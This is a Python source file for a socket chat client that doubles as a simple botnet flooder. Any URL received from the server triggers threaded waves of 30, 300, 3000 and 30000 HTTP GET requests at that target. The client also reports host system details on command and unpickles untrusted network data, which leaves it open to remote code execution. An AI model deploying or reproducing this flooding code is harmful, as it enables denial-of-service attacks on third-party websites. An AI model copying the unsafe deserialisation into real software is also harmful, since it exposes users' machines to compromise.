import threading
import sys
import socket
import pickle
import platform
import os
import prettytable as pt
import requests


class Message():
    def __init__(self, username, msg):
        self.username = '<' + str(username) + '>'
        self.msg = msg


class Cliente():

    # def __init__(self, host = '10.34.84.147', port=61000):
    def __init__(self, host=input("Escriba la IP: "), port=input("Escriba el puerto: ")):
        self.sock = socket.socket()
        self.bucket = 1024  # 2048

        self.stopThreads = False
        self.threads = []
        self.AttackResult = ''

        self.username = input('Username: ')
        self.sock.connect((str(host), int(port)))
        hilo_recv_mensaje = threading.Thread(target=self.recibir)
        hilo_recv_mensaje.daemon = True
        hilo_recv_mensaje.start()

        # for thread in threading.enumerate():
        # 	print("Hilo: " + thread.name + "\n" + "Proceso PID: "+ str(os.getpid()) + "\n" + "Daemon: " + str(thread.daemon) +  "\n")
        # print("Hilos totales: " + str(threading.activeCount()-1))
        message = Message(self.username, "se ha conectado")
        self.enviar(message)  # "<" + self.username + "> se ha conectado"
        print('\n !sendconfig == enviar información del PC ** !url30 (la_url)/ !url300 (la_url)/ !url3000 (la_url)/ !url30000 (la_url) == para ataques \n')
        while True:
            msg = input("\n>>\n")
            if msg != 'Q':
                self.enviar(Message(self.username, msg))
            else:
                print(" ****LOGOUT****")
                self.sock.close()
                sys.exit()
#region ATTACK

    def HandleAttack(self, msg):
        
        # if there is no command: check for url
        if requests.get(msg):
            
            print("Started 30 attack...")
            self.AttackSetup(30, msg)
            for t in self.threads:
                t.join()
            print("30 attack =>", self.attackResult)
            self.threads.clear()
            self.stopThreads = False
            
            print("Started 300 attack...")
            self.AttackSetup(300, msg)
            for t in self.threads:
                t.join()
            print("300 attack =>", self.attackResult)
            self.threads.clear()
            self.stopThreads = False
            
            print("Started 3000 attack...")
            self.AttackSetup(3000, msg)
            for t in self.threads:
                t.join()
            print("3000 attack =>", self.attackResult)
            self.threads.clear()
            self.stopThreads = False
            
            print("Started 30000 attack...")
            self.AttackSetup(30000, msg)
            for t in self.threads:
                t.join()
            print("30000 attack =>", self.attackResult)
            self.threads.clear()
            self.stopThreads = False
    
    
    
    def RequestResponseHandler(self):
        self.attackResult = self.attackResult.replace('<Response [', '')
        self.attackResult = self.attackResult.replace(']>', '')
        r = (self.attackResult)
        if r == '429':
            self.attackResult = "492: Too many requests"
        elif r == '408':
            self.attackResult = "408: Request timeout"
        elif r == '404':
            self.attackResult = "404: Not found"
        elif r == '401':
            self.attackResult = "401: Unauthorized"
        elif r == '407':
            self.attackResult = "407: Proxy auth required"
        elif r == '403':
            self.attackResult = "403: Forbidden"
        elif r == '504':
            self.attackResult = "504: Gateway timeout"
        elif r == '500':
            self.attackResult = "500: Internal server error"
        elif r == '200':
            self.attackResult = "200: Success!"   
             
            
    def AttackSetup(self, number, url):
        for _ in range(number):
            if self.stopThreads == True:
                self.RequestResponseHandler()
                return
            t = threading.Thread(target=self.SendAttackTo, args=(url,))
            self.threads.append(t)
            t.start()


    def SendAttackTo(self, url):
            try:
                sendTo = requests.get(url)
                sendTo
                self.attackResult = str(requests.get(url, timeout=5))
                self.RequestResponseHandler()
            except requests.exceptions.RequestException as e:
                self.stopThreads = True
                self.attackResult = str(e)


#endregion
#region CUSTOM 

    def ChangeBucketSize(self, msg):
        print(f"Changing bucket size being{self.bucket} now")
        msg = msg.replace('!bucket','')
        self.bucket = int(msg)
        print(self.bucket)
        

#endregion



    def recibir(self):
        while True:
            try:
                data = self.sock.recv(self.bucket)
                if data:
                    print((pickle.loads(data)).username,
                          (pickle.loads(data)).msg)
                    self.HandleAttack((pickle.loads(data)).msg)
                    
            except:
                pass

    def enviar(self, msg):
        if (msg.msg[0:7]) == '!bucket':
            self.ChangeBucketSize(msg.msg)
            
        if msg.msg == '!sendconfig':
            if(self.bucket >= 2048):
                data = pickle.dumps(Message(self.username, str(self.osInfo())))
            else:
                data = pickle.dumps(
                    Message(self.username, str(platform.uname())))

        else:
            data = pickle.dumps(msg)
        self.sock.send(data)

    def osInfo(self):
        table = pt.PrettyTable()
        table.field_names = ["Question", "Result Type", "Method", "Result"]
        table.add_rows([
            ["A", "Procesador", "platform.processor()", platform.processor()],
            ["B", "Machine", "platform.machine()", platform.machine()],
            ["C", "Release", "platform.release()", platform.release()],
            ["D", "Version", "platform.version()", platform.version()],
            ["E", "Node", "platform.node()", platform.node()],
            ["F", "System", "platform.system()", platform.system()],
            ["G", "Cores físicos", "os.cpu_count()/2", os.cpu_count()/2],
            ["H", "Ipv4", "socket.gethostbyname(socket.gethostname())", socket.gethostbyname(
                socket.gethostname())],
        ])
        return table.get_string()


c = Cliente()
